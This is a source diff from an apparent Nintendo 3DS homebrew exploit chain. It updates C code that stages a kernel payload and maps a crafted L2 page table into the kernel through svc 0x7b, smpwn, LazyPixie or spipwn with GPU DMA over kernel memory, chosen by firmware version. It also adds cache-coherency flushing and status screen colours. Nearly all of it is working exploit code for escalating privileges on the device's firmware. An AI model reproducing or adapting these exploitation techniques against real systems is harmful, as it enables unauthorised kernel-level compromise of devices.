@@ -22,15 +22,24 @@ typedef union ExploitChainLayout {
     BlobLayout blobLayout;
 } ExploitChainLayout;
 
-static_assert(sizeof(ExploitChainLayout) == 0x10000);
+static_assert(sizeof(ExploitChainLayout) == 0x10000, "Wrong ExploitChainLayout size");
 
 static void prepareBlobLayout(BlobLayout *layout, Handle gspHandle, const u8 *khc3dsBin, size_t khc3dsBinSize)
 {
-    memset(layout, 0, sizeof(BlobLayout));
+    memset(layout->l2table, 0, 0x400);
     memcpy(layout->code, khc3dsBin, khc3dsBinSize);
     khc3dsPrepareL2Table(layout);
 
     // Ensure everything (esp. the layout) is written back into the main memory
+    gspDoFullCleanInvCacheTrick(gspHandle);
+}
+
+static void ensurePageTableCoherency(Handle gspHandle)
+{
+    // https://developer.arm.com/docs/ddi0360/e/memory-management-unit/hardware-page-table-translation
+    // "MPCore hardware page table walks do not cause a read from the level one Unified/Data Cache"
+    __dsb();
+    __flush_prefetch_buffer();
     gspDoFullCleanInvCacheTrick(gspHandle);
 }
 
@@ -49,32 +58,39 @@ static Result doExploitChain(
 
         prepareBlobLayout(&layout->blobLayout, gspHandle, khc3dsBin, khc3dsBinSize);
         mapL2TableViaSvc0x7b(&layout->blobLayout);
-
-        // https://developer.arm.com/docs/ddi0360/e/memory-management-unit/hardware-page-table-translation
-        // "MPCore hardware page table walks do not cause a read from the level one Unified/Data Cache"
-        gspDoFullCleanInvCacheTrick(gspHandle);
+        ensurePageTableCoherency(gspHandle);
     }
 
 #ifndef MEMCHUNKHAX_ONLY // reduces the size by around 3KB
     else {
-        // 9.3 and above: use smpwn (7.x+) & spipwn, as I've only bothered to
+        // 9.3 and above: use smpwn (7.x+) and LazyPixie or spipwn (>= 11.12), as I've only bothered to
         // put 8.x+ constants, older versions aren't exploitable that way;
-        // then GPU DMA over the kernel memory.
+        // then GPU DMA over the kernel memory, in the case of spipwn.
 
         // Exploit sm
-        SmpwnContext *ctx = (SmpwnContext *)layout->workBuffer;
+        SmpwnContext *ctx = (SmpwnContext *)layout->blobLayout.smallWorkBuffer;
         Handle srvHandle;
+
+        prepareBlobLayout(&layout->blobLayout, gspHandle, khc3dsBin, khc3dsBinSize);
+
         TRY_ALL(smpwn(&srvHandle, ctx));
         //TRY(smPartiallyCleanupSmpwn(ctx));
-        TRY(smRemoveRestrictions(ctx));
 
-        // We now have access to all services, and can spawn new sessions of srv:pm
-        // Exploit spi with that.
-        TRY(spipwn(srvHandle));
+        if (kernelVersionMinor < 56) {
+            // Do LazyPixie
+            // This is better than spipwn, in case the user has mismatching versions of titles
+            TRY(smMapL2TableViaLazyPixie(ctx, &layout->blobLayout));
+            ensurePageTableCoherency(gspHandle);
+        } else {
+            TRY(smRemoveRestrictions(ctx));
 
-        // We can now GPU DMA the kernel. Let's map the L2 table we have prepared
-        prepareBlobLayout(&layout->blobLayout, gspHandle, khc3dsBin, khc3dsBinSize);
-        mapL2TableViaGpuDma(&layout->blobLayout, layout->blobLayout.smallWorkBuffer, gspHandle);
+            // We now have access to all services, and can spawn new sessions of srv:pm
+            // Exploit spi with that.
+            TRY(spipwn(srvHandle));
+
+            // We can now GPU DMA the kernel. Let's map the L2 table we have prepared
+            mapL2TableViaGpuDma(&layout->blobLayout, layout->blobLayout.smallWorkBuffer, gspHandle);
+        }
 
         svcCloseHandle(srvHandle);
     }
@@ -105,8 +121,15 @@ Result otherappMain(u32 paramBlkAddr, const u8 *khc3dsBin, size_t khc3dsBinSize)
     }
     ExploitChainLayout *layout = (ExploitChainLayout *)((paramBlkAddr + 0x1000) & ~0xFFF);
 
-    // Set top screen fill white
-    gspSetLcdFill(gspHandle, true, 255, 255, 255);
+    // Set top screen fill: gray (< 9.3), blueish (< 11.12), or white
+    u8 kernelVersionMinor = KERNEL_VERSION_MINOR;
+    if (kernelVersionMinor < 48) {
+        gspSetLcdFill(gspHandle, true, 128, 128, 128);
+    } else if (kernelVersionMinor < 56) {
+        gspSetLcdFill(gspHandle, true, 128, 128, 200);
+    } else {
+        gspSetLcdFill(gspHandle, true, 255, 255, 255);
+    }
 
     // Set top priority for our thread
     TRY(svcSetThreadPriority(CUR_THREAD_HANDLE, 0x18));
